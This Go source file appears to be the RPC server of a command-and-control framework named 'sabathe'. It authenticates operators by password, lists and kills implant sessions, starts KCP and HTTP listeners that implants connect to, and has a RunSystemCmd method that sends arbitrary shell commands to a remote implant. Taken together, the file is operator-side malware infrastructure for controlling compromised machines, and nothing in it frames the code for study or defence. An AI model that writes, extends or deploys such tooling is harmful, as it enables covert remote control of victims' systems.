package register

import (
	"context"
	"fmt"
	"github.com/smallnest/rpcx/server"
	"github.com/xtaci/kcp-go"
	"log"
	"net"
	"net/http"
	"sabathe/implant/config"
	"sabathe/server/goroutes"
	"sabathe/server/mthod"
	"sabathe/server/transport"
	"strings"
)

// get commands and use rpcx to return a result

var AuthPassword string

type Service struct{}

type Requests struct {
	Command     string
	Listener    Listener // listener
	Session     Session
	AuthRequest string
}

type Listener struct {
	JobID               int
	Name                string
	ListenerKCPAddress  string
	ListenerHTTPAddress string
}

type Session struct {
	SessionID   int
	SessionName string
}

type Response struct {
	Body             interface{}
	ActiveJobMsg     []*goroutes.JobInfo
	ActiveSessionMsg []*goroutes.SessionInfo
	SessionInfo      goroutes.SessionInfo
	Error            error
	Message          string
	AuthResponse     bool
}

// ---------- [Login] ---------------

func (rpc *Service) AuthUserLogin(ctx context.Context, r *Requests, w *Response) error {
	log.Println("rpc client request AuthUserLogin method")
	log.Println("rpc client number",len(transport.RpcServer.ActiveClientConn()))
	if r.AuthRequest == AuthPassword {
		w.AuthResponse = true
	} else {
		w.AuthResponse = false
	}
	return nil
}

// -------------[session]-------------

func (rpc *Service) KillSession(ctx context.Context, r *Requests, w *Response) error {
	log.Println("rpc client request KillSession method")
	//client := ctx.Value(server.RemoteConnContextKey).(net.Conn)
	SessionJob := goroutes.Sessions.Get(r.Session.SessionID)
	if SessionJob == nil {
		w.Error = fmt.Errorf("not session id %v", r.Session.SessionID)
		return nil
	}
	/*
		if SessionJob.Debug == true {
			w.Error = fmt.Errorf("session is using id %v", r.Session.SessionID)
			return nil
		}*/
	var msg = config.ImplantCmd{
		Cmd: "exit",
	}
	packs, err := mthod.MessageJson(msg)

	_, _ = SessionJob.Implant.KcpConn.Write(packs)
	_ = SessionJob.Implant.KcpConn.Close()
	goroutes.Sessions.Remove(SessionJob)
	for _,c := range transport.RpcServer.ActiveClientConn(){
		err = transport.RpcServer.SendMessage(c, "session_get", "session_method", nil, []byte(fmt.Sprintf("👻session is close id %v", r.Session.SessionID)))
		if err != nil {
			return err
		}
	}
	return nil
}

func (rpc *Service) GetSessions(ctx context.Context, r *Requests, w *Response) error {
	log.Println("rpc client request GetSessions method")
	// get all alive session
	var active []*goroutes.SessionInfo
	for _, session := range goroutes.Sessions.All() {
		active = append(active, &goroutes.SessionInfo{
			SessionID:    session.SessionID,
			PersistentID: session.PersistentID,
			Description:  session.Description,
			Name:         session.Name,
			ImplantType:  session.Implant.ImplantType,
			ImplantUser:  session.Implant.ImplantUser,
			Debug:        session.Debug,
		})
	}
	w.ActiveSessionMsg = active
	return nil
}

func (rpc *Service) UseSession(ctx context.Context, r *Requests, w *Response) error {
	log.Println("rpc client request UseSession method")
	var session = goroutes.Sessions.Get(r.Session.SessionID)
	if session == nil {
		w.Error = fmt.Errorf("not find session id %v", r.Session.SessionID)
		return nil
	}
	session.Debug = true
	w.SessionInfo = goroutes.SessionInfo{
		SessionID:    r.Session.SessionID,
		Name:         session.Name,
		Description:  session.Description,
		PersistentID: session.PersistentID,
		Debug:        true,
		ImplantType:  session.Implant.ImplantType,
		ImplantUser:  session.Implant.ImplantUser,
	}
	return nil
}

// --------[listener]-------------------------------------

func (rpc *Service) GetHttpListener(ctx context.Context, r *Requests, w *Response) error {
	log.Println("rpc client request HttpListener method")
	client := ctx.Value(server.RemoteConnContextKey).(net.Conn)
	h := strings.Split(r.Listener.ListenerHTTPAddress, ":")
	t := strings.Split(r.Listener.ListenerKCPAddress, ":")
	if len(h) == 2 && len(t) == 2 {
		log.Println("new http listener and kcp listener")
		log.Println(fmt.Sprintf("Get kcp %v http %v", r.Listener.ListenerKCPAddress, r.Listener.ListenerHTTPAddress))
		var httpServer *http.Server
		var kcpServer *kcp.Listener
		var ListenerName string
		if r.Listener.Name != "" {
			ListenerName = r.Listener.Name
		} else {
			ListenerName = mthod.RandomString(5)
		}
		// create http listener and kcp listener append jobs
		httpServer, err1 := transport.HttpListener(r.Listener.ListenerHTTPAddress)
		if err1 != nil {
			return err1
		}
		kcpServer, err2 := transport.KcpListener(r.Listener.ListenerKCPAddress, client, 1)
		if err2 != nil {
			return fmt.Errorf("the kcp address is occupied")
		}
		if err1 == nil && err2 == nil {
			// add a job in Jobs
			//fmt.Println(kcpServer, httpServer)
			var id = goroutes.NextJobID()
			goroutes.Jobs.Add(&goroutes.Job{
				ID:               id,
				Name:             ListenerName,
				Description:      "kcp-http",
				ReturnMsgAddress: r.Listener.ListenerHTTPAddress,
				SendMsgAddress:   r.Listener.ListenerKCPAddress,
				Servers: &goroutes.Server{
					HttpServer: httpServer,
					KcpServer:  kcpServer,
				},
			})
			w.Message = "success"
		} else {
			w.Error = fmt.Errorf("create listener failed kcp or http")
		}
	} else {
		w.Error = fmt.Errorf("address format is error")
	}
	return nil
}

func (rpc *Service) GetListeners(ctx context.Context, r *Requests, w *Response) error {
	log.Println("rpc client request GetListeners method")
	// get all alive session
	var active []*goroutes.JobInfo
	for _, job := range goroutes.Jobs.All() {
		active = append(active, &goroutes.JobInfo{
			ID:               job.ID,
			PersistentID:     job.PersistentID,
			Description:      job.Description,
			SendMsgAddress:   job.SendMsgAddress,
			ReturnMsgAddress: job.ReturnMsgAddress,
			Name:             job.Name,
		})
	}
	w.ActiveJobMsg = active
	return nil
}

func (rpc *Service) KillListener(ctx context.Context, r *Requests, w *Response) error {
	log.Println("rpc client request KillListener method")
	listenerJob := goroutes.Jobs.Get(r.Listener.JobID)
	if listenerJob == nil {
		w.Error = fmt.Errorf("not listener id %v", r.Listener.JobID)
		return nil
	}
	err := listenerJob.Servers.HttpServer.Close() // close
	//err := listenerJob.Servers.HttpServer.Close()
	if err != nil {
		return err
	}
	err = listenerJob.Servers.KcpServer.Close()
	if err != nil {
		return err
	}
	//del job
	goroutes.Jobs.Remove(listenerJob)
	return nil
}

//------------[command]----------------------

func (rpc *Service) RunSystemCmd(ctx context.Context, r *Requests, w *Response) error {
	session := goroutes.Sessions.Get(r.Session.SessionID)
	if session != nil {
		fmt.Println(r.Command, r.Session.SessionID)
		var msg = config.ImplantCmd{
			Cmd:  "shell",
			Args: []string{r.Command},
		}
		packs, err := mthod.MessageJson(msg)
		if err != nil {
			return err
		}
		_, _ = session.Implant.KcpConn.Write(packs)
		transport.UsingConn = ctx.Value(server.RemoteConnContextKey).(net.Conn)
	}
	return nil
}
